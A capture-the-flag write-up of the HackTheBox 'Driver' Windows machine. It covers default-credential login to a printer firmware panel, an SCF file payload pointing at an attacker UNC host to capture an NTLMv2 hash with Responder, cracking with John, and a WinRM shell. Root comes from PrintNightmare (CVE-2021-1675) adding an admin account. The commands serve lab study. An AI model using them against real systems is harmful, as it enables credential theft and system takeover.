---
title: "HTB - Driver (Easy | Windows | Web)"
date: 2026-09-23 12:00:00 +0000
categories: [HackTheBox, Web]
tags: [htb, windows, default-creds, scf, scf-file-attack, responder, john, winrm, printnightmare, cve-2021-1675, net-ntlmv2, invoke-printnightmare, printer, nxc, netexec]
description: "Default creds on an IIS firmware-upload portal, an SCF file attack to capture tony's Net-NTLMv2 hash (cracked with John), WinRM access, then PrintNightmare (CVE-2021-1675) for SYSTEM"
image:
  path: /assets/img/driver.png
---

## **Recon**


```bash
nmap -p- -sSCV --open --min-rate 5000 <target>
```

```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  tcpwrapped
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-09-25T02:14:35
|_  start_date: 2026-09-25T02:11:41
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

### Service Discovery Analysis

The Nmap scan reveals four key services running on the target machine:

- **HTTP (Port 80):** Microsoft IIS 10.0 — immediately prompts for HTTP Basic Authentication with the realm **"MFP Firmware Update Center"** — this reveals the purpose of the application before we even log in
- **RPC (Port 135):** Microsoft Windows RPC endpoint
- **SMB (Port 445):** Microsoft Windows file sharing — critically, **SMB message signing is disabled**, making it vulnerable to relay attacks
- **WinRM (Port 5985):** Windows Remote Management — if we obtain valid credentials, this gives us an interactive shell
- **TCP (Port 7680):** tcpwrapped — likely Windows Update Delivery Optimization (WUDO), not an attack vector

**OS:** Windows **Hostname:** DRIVER **Workgroup:** WORKGROUP (standalone machine, not domain-joined)

Several things stand out immediately: the **HTTP Basic Auth realm** reveals this is a "MFP Firmware Update Center" — MFP stands for Multi-Function Printer. Printer management panels are notorious for default credentials and file upload functionality. Combined with **SMB signing disabled** and **WinRM open**, if we can obtain credentials, we have a direct path to remote shell access.

---

## **User**

### HTTP Basic Authentication Bypass - Default Credentials

Navigating to `http://<target>/` triggers an HTTP Basic Authentication prompt:

![](/assets/img/driver/Pasted_image_20260924171630.png)

The realm name "MFP Firmware Update Center" strongly suggests a printer management application. These panels commonly ship with default credentials that are never changed. We try the most common default combination:

- **Username:** `admin`
- **Password:** `admin`

![](/assets/img/driver/Pasted_image_20260924162012.png)

Access is granted. The panel is a **MFP Firmware Update Center** — a web interface for managing printer firmware updates. Exploring the available sections reveals a **firmware upload** feature:

![](/assets/img/driver/Pasted_image_20260924163728.png)

This upload functionality is the key attack vector. Files uploaded here are likely placed on an SMB share that a privileged service or user account periodically accesses. This is the classic setup for an SCF file attack.

### Overview - SCF File Attack (Shell Command File NTLM Hash Capture)

**What is an SCF file?** A Shell Command File (`.scf`) is a Windows file format used by Windows Explorer to define shell commands. The critical property is the `IconFile` directive — when Windows Explorer renders a folder containing an SCF file, it automatically attempts to load the icon from the specified path, including UNC paths (`\\server\share\file`).

**Why does this capture NTLM hashes?** When Windows tries to load an icon from a UNC path pointing to an attacker-controlled server, it initiates an SMB connection and authenticates using the current user's NTLM credentials — even without any user interaction. If Responder is listening on the attacker's machine, it intercepts this authentication attempt and captures the NTLMv2 hash.

**Why does this work here?** The firmware upload panel likely places uploaded files on an SMB share that a privileged service account (or the administrator) browses — either manually or automatically. When they navigate to the folder containing our SCF file, Windows automatically triggers the icon fetch, sending their NTLM hash to our Responder listener.

### SCF File Attack - NTLM Hash Capture

We create a malicious SCF file named `@Inventory.scf`. The `@` prefix ensures the file sorts to the top of any directory listing — maximizing the chance it's processed immediately when the folder is opened. The `IconFile` directive points to a non-existent share on our attacker machine, forcing an NTLM authentication attempt:

```bash
[Shell]
Command=2
IconFile=\\<attacker_ip>\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

We set up Responder to listen for incoming NTLM authentication attempts. Responder acts as a rogue SMB server — when Windows connects to `\\<attacker_ip>\share\`, it responds with a challenge, captures the NTLMv2 hash, and logs it:

```bash
sudo responder -I tun0
```

We upload the `@Inventory.scf` file through the firmware upload panel:

![](/assets/img/driver/Pasted_image_20260924163935.png)

When the share is accessed by a privileged user, Responder captures the NTLMv2 hash for the user `tony`.

### Cracking the NTLMv2 Hash

We use John the Ripper to crack the captured NTLMv2 hash against the rockyou.txt wordlist:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
liltony          (tony)
```

**Credentials obtained:** `tony:liltony`

### WinRM Access as tony

We verify the credentials against WinRM using netexec:

```bash
nxc winrm <target> -u 'tony' -p 'liltony'
```

![](/assets/img/driver/Pasted_image_20260924165204.png)

The output shows `Pwn3d!` — confirming tony has WinRM access. We connect via evil-winrm:

```bash
evil-winrm -i <target> -u 'tony' -p 'liltony'
```

![](/assets/img/driver/Pasted_image_20260924165237.png)

A PowerShell session is established as tony. The user flag can now be retrieved.

---

## **Root**

### Print Spooler Enumeration

Since the machine is named "DRIVER" and hosts a printer firmware management panel, the Windows Print Spooler service is a natural target for privilege escalation. We verify that the Print Spooler service is running and accepting connections by checking if the named pipe `spoolss` exists and is active:

```powershell
ls \\localhost\pipe\spoolss
```

![](/assets/img/driver/Pasted_image_20260924170225.png)

The named pipe `spoolss` exists and is accessible — this confirms that the **Print Spooler service is running** and listening for RPC connections. The `spoolss` pipe is the communication channel used by the Windows Print Spooler API. Its presence means the `RpcAddPrinterDriverEx` function — the exact function exploited by PrintNightmare — is available and callable.

### Overview - CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)

**What is PrintNightmare?** PrintNightmare is a critical Windows vulnerability discovered in 2021 affecting the Windows Print Spooler service (`spoolsv.exe`). It consists of two related CVEs:

- **CVE-2021-1675:** Local Privilege Escalation via `RpcAddPrinterDriverEx`
- **CVE-2021-34527:** Remote Code Execution via the same function

**How does it work?** The Windows Print Spooler runs as `SYSTEM` (the highest Windows privilege level). The `RpcAddPrinterDriverEx` RPC function allows authenticated users to install printer drivers — and drivers run as SYSTEM. By passing a malicious DLL as a printer driver, any authenticated user can execute code as SYSTEM.

**Why does this work here?** The Print Spooler is confirmed running via the `spoolss` pipe. As an authenticated user (tony), we can call `RpcAddPrinterDriverEx` to load a malicious driver that creates a new local administrator account — giving us full system access.

### PrintNightmare Exploitation (CVE-2021-1675)

#### Step 1: Upload Exploit Script

We upload the CVE-2021-1675 PowerShell exploit to the target via the evil-winrm session:

```powershell
upload CVE-2021-1675.ps1
```

#### Step 2: Import the Exploit Module

We import the PowerShell module to load the exploit functions into the current session:

```powershell
Import-Module .\CVE-2021-1675.ps1
```

#### Step 3: Bypass PowerShell Execution Policy

We temporarily bypass PowerShell's script execution policy for the current process. The `-Scope Process` flag ensures this change only affects the current PowerShell session and is not persistent:

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

#### Step 4: Execute PrintNightmare Exploit

We invoke the exploit to create a new local administrator account. The `Invoke-Nightmare` function calls `RpcAddPrinterDriverEx` with a malicious DLL that runs as SYSTEM and executes the `net user` and `net localgroup` commands to add our new user:

```powershell
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintDriver"
```

![](/assets/img/driver/Pasted_image_20260924171438.png)

The exploit runs successfully — a new local administrator account `hacker:Pwnd1234!` is created with SYSTEM-level execution.

#### Step 5: Connect as New Administrator

We establish a new evil-winrm session using the newly created administrator account:

```powershell
evil-winrm -i <target> -u 'hacker' -p 'Pwnd1234!'
```

![](/assets/img/driver/Pasted_image_20260924171538.png)

Full administrator access is achieved. The root flag can now be retrieved.

---

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified IIS 10.0 on port 80 with HTTP Basic Auth revealing an MFP Firmware Update Center, SMB with signing disabled on port 445, and WinRM on port 5985
2. **Default Credentials:** Accessed the firmware panel using default credentials `admin:admin`
3. **Firmware Upload Discovery:** Found a file upload feature intended for printer firmware — identified as a vector for SCF file attack
4. **SCF File Attack:** Created `@Inventory.scf` with a malicious `IconFile` UNC path pointing to our Responder listener; uploaded it through the firmware panel
5. **NTLM Hash Capture:** Responder intercepted the automatic NTLM authentication triggered when a privileged user browsed the folder containing the SCF file, capturing tony's NTLMv2 hash
6. **Hash Cracking:** Cracked the NTLMv2 hash using John the Ripper and rockyou.txt, obtaining `tony:liltony`
7. **WinRM Access:** Verified credentials with netexec and established an evil-winrm session as tony; retrieved user flag
8. **Print Spooler Verification:** Confirmed the Print Spooler service was running via the `spoolss` named pipe
9. **PrintNightmare Exploitation (CVE-2021-1675):** Uploaded and executed `CVE-2021-1675.ps1` to call `RpcAddPrinterDriverEx` with a malicious driver, creating a new local administrator account
10. **Root Access:** Connected via evil-winrm as the newly created administrator and retrieved root flag